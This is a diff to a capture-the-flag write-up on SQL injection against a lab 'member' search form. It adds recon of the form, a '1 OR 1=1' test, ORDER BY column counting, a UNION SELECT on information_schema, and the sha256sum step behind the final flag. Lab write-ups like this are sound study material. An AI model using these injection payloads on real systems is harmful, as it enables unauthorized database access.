@@ -1,8 +1,74 @@
 # Extract the Flag from `Member_images.list_images`
 
 ### **1. the scenario**
+## Recon: Understanding the form and context
+
+1. The form is a **GET form**:
+
+```html
+<form action="#" method="GET">
+  <input type="hidden" name="page" value="member">
+  <input type="text" name="id" style="width:100%;">
+  <input type="submit" value="Submit" name="Submit">
+</form>
+```
+
+2. The parameter `id` is used in a query like:
+
+```sql
+SELECT first_name, last_name FROM users WHERE User_id = <user input>
+```
 
 
+* **Cause:** The application escapes quotes (`\'`) → classic **quote-escaping issue**.
+
+---
+
+## Step 1: Testing SQL injection
+
+* For initial testing i try this simplest known statement : `1 OR 1=1`
+* i get this output
+
+``` ID: 1 or 1 
+First name: one
+Surname : me
+ID: 1 or 1 
+First name: two
+Surname : me
+ID: 1 or 1 
+First name: three
+Surname : me
+ID: 1 or 1 
+First name: Flag
+Surname : GetThe
+Search member by ID:
+	
+
+Submit 
+```
+
+THIS DATABASE IS VULNERABLE.
+
+
+## Step 2: Determine number of columns
+
+Use `ORDER BY` injection to find the number of columns:
+
+```
+1 ORDER BY 1-- -
+1 ORDER BY 2-- -
+1 ORDER BY 3-- -
+```
+
+* Stop at the first error.
+* Result: 2 columns exist.
+
+---
+
+## Step 3: Investigating our database:
+
+
+### **1. List the databases_names**
 ```sql 
 1 UNION SELECT schema_name, NULL FROM information_schema.schemata 
 
@@ -93,7 +159,10 @@ albatroz
 
 #### d) Step 3 — SHA-256
 
-* Compute SHA-256 of `albatroz`.
+* Compute SHA-256 of `albatroz`, with the command : 
+```bash
+echo -n "albatroz" | sha256sum
+```
 * the **final flag** :  f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 
 ### **5. What the vulnerability is (OWASP classification)**
